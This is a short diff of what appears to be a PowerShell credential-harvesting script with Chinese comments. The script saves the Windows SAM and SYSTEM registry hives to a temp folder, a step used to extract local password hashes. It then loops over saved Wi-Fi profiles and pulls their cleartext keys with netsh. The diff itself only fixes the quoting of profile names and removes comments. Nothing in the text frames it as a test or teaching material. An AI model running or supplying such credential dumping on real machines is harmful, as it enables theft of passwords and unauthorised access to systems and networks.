@@ -10,6 +10,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Loc
 
 reg save HKLM\SAM c:\windows\temp\sam.hiv
 reg save HKLM\SYSTEM c:\windows\temp\system.hiv
+
 # 網路密碼
 $profiles = (netsh wlan show profiles) -match ":\s+(.+)$" | ForEach-Object { 
     $name = $_.Split(':')[-1].Trim()
@@ -20,11 +21,8 @@ $results = New-Object System.Collections.Generic.List[string]
 
 if ($profiles) {
     foreach ($name in $profiles) {
-        # 取得單一 Profile 的詳細資訊
-        $raw = netsh wlan show profile name="$name" key=clear
+        $raw = netsh wlan show profile name="`"$name`"" key=clear
         
-        # 使用通用比對：抓取包含 " :" 的行，且該行內容通常在最後面
-        # 在大多數語系中，密碼位於 "Key Content" 或 "關鍵內容" 這一行
         $passLine = $raw | Where-Object { $_ -match "Key Content|關鍵內容|关键内容" }
         
         if ($passLine) {
